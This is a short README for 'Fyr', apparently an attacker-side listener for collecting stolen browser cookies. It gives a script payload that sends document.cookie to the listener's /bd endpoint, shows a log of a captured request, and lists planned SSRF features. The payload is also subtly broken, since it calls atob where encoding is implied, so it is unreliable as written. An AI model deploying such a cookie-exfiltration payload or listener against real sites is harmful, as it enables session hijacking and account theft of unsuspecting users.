# Fyr


## Features

- Cookie extraction at `/` or `/bd` with parameter `?d=` e.g. `"URL/bd?d="+atob(document.cookie)`

Usage:

```
       ▄████████ ▄██   ▄      ▄████████
      ███    ███ ███   ██▄   ███    ███
      ███    █▀  ███▄▄▄███   ███    ███
     ▄███▄▄▄     ▀▀▀▀▀▀███  ▄███▄▄▄▄██▀
    ▀▀███▀▀▀     ▄██   ███ ▀▀███▀▀▀▀▀
      ███        ███   ███ ▀███████████
      ███        ███   ███   ███    ███
      ███         ▀█████▀    ███    ███
                             ███    ███

Launching HTTPServer @ http://localhost:8888
127.0.0.1 - - [18/Sep/2025 19:04:26] "GET /?d=SSBIRUNLSU4nIExPVkUgRllS HTTP/1.1" 200 -
[*] Method: GET
[*] Path: /?d=SSBIRUNLSU4nIExPVkUgRllS
[*] Headers:
  Host: localhost:8888
  User-Agent: curl/8.16.0
  Accept: */*
[*] Content:
I HECKIN' LOVE FYR
```

## WIP

- SSRF (web cradle and stuff)
- `/tools` dir
- Logging (Files etc.)
